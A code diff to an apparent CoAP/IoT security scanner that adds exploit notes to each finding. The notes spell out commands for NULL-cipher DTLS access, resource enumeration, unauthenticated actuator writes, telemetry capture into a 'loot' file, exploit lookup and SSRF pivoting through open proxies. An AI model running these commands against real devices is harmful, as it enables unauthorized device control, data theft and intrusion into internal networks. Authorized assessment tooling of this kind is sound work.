@@ -962,10 +962,12 @@ def coap_targets(hosts: list[Host]) -> list[dict]:
     return out
 
 
-def _finding(sev, title, target, detail, cmd, rem, cwes, kind=""):
+def _finding(sev, title, target, detail, cmd, rem, cwes, kind="",
+             exploit_note="", depth_tier=""):
     return {"severity": sev, "title": title, "target": target, "detail": detail,
             "tool": "coap-client", "command": cmd, "remediation": rem,
-            "cwes": cwes, "kind": kind}
+            "cwes": cwes, "kind": kind,
+            "exploit_note": exploit_note, "depth_tier": depth_tier}
 
 
 def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
@@ -1011,7 +1013,12 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                         "-cipher 'NULL'",
                         "Restrict the CoAP-DTLS cipher list to AES-CCM_8 / GCM per "
                         "RFC 7925 §4.2 — TLS_PSK_WITH_AES_128_CCM_8 is the IoT MTI.",
-                        ["CWE-326", "CWE-327"], kind="coap_dtls_weak"))
+                        ["CWE-326", "CWE-327"], kind="coap_dtls_weak",
+                        exploit_note=(
+                            f"openssl s_client -dtls1_2 -cipher 'NULL' -psk_identity '<any>' "
+                            f"-psk 00 -connect {h.ip}:{p.portid}; then send a CoAP GET "
+                            "over that channel."),
+                        depth_tier="t1"))
                 out.append(_finding(
                     "info", "CoAP-DTLS endpoint reachable", tgt,
                     f"DTLS 1.2 ClientHello returned "
@@ -1048,7 +1055,11 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                     "Require authentication on /.well-known/core (OSCORE / DTLS-PSK) "
                     "or restrict the device to a management VLAN. Do not publish "
                     "actuator resources anonymously.",
-                    ["CWE-200", "CWE-306"], kind="coap_resource_inventory"))
+                    ["CWE-200", "CWE-306"], kind="coap_resource_inventory",
+                    exploit_note=(
+                        f"coap-client -m get coap://{h.ip}:{p.portid}/.well-known/core; "
+                        f"for path in <list>; do coap-client -m get coap://{h.ip}:{p.portid}$path; done."),
+                    depth_tier="t1"))
 
             # Anonymous write to an actuator (critical).
             for wr in (pr.get("writable") or []):
@@ -1065,7 +1076,13 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                     f"coap-client -m put -e 'x' coap://{h.ip}:{p.portid}{wr['path']}",
                     "Require authentication (OSCORE / DTLS-PSK) on every writable "
                     "resource; expose actuators only to authorised principals.",
-                    ["CWE-284", "CWE-306", "CWE-862"], kind="coap_actuator_exposed"))
+                    ["CWE-284", "CWE-306", "CWE-862"], kind="coap_actuator_exposed",
+                    exploit_note=(
+                        f"coap-client -m put -e '<pre_value>' coap://{h.ip}:{p.portid}{wr['path']} "
+                        "(recce already captured pre_value); operator command example: "
+                        f"coap-client -m put -e '1' coap://{h.ip}:{p.portid}/a/light — "
+                        "DO NOT run without written authorization."),
+                    depth_tier="t2"))
 
             # Device disclosure via /oic/d etc.
             for entry in (pr.get("readable") or []):
@@ -1088,7 +1105,11 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                     "Restrict device-info resources to authenticated principals; "
                     "do not publish vendor/firmware strings on unauthenticated "
                     "endpoints.",
-                    ["CWE-200"], kind="coap_device_disclosure"))
+                    ["CWE-200"], kind="coap_device_disclosure",
+                    exploit_note=(
+                        f"coap-client -m get -f 60 coap://{h.ip}:{p.portid}/oic/d | cbor-diag; "
+                        "then searchsploit <vendor> <firmware>."),
+                    depth_tier="t2"))
 
             # Observe telemetry leak.
             for obs in (pr.get("observe") or []):
@@ -1103,7 +1124,11 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                     f"coap-client -m get -s 5 coap://{h.ip}:{p.portid}{obs['path']}",
                     "Require authentication on observable resources; enforce ACLs "
                     "so unauthenticated clients cannot subscribe.",
-                    ["CWE-200", "CWE-306"], kind="coap_observe_leak"))
+                    ["CWE-200", "CWE-306"], kind="coap_observe_leak",
+                    exploit_note=(
+                        f"coap-client -m get -s 60 coap://{h.ip}:{p.portid}{obs['path']} | "
+                        "tee loot/coap_obs.txt; grep -E 'lat|lon|temp|volt|amp' loot/coap_obs.txt."),
+                    depth_tier="t2"))
 
             # Proxy relay abuse.
             pxy = pr.get("proxy") or {}
@@ -1119,7 +1144,13 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                     "coap://internal.target/path",
                     "Disable proxy forwarding on the CoAP stack, or restrict the "
                     "allowed proxy targets with an explicit allowlist.",
-                    ["CWE-918", "CWE-441"], kind="coap_open_proxy"))
+                    ["CWE-918", "CWE-441"], kind="coap_open_proxy",
+                    exploit_note=(
+                        f"coap-client -m get -P coap://{h.ip}:{p.portid} "
+                        "coap://127.0.0.1/.well-known/core; then "
+                        f"coap-client -m get -P coap://{h.ip}:{p.portid} "
+                        "http://<internal-ip>/ to test HTTP SSRF pivot."),
+                    depth_tier="t1"))
 
             # UDP amplifier.
             ratio = pr.get("amp_ratio") or 0.0
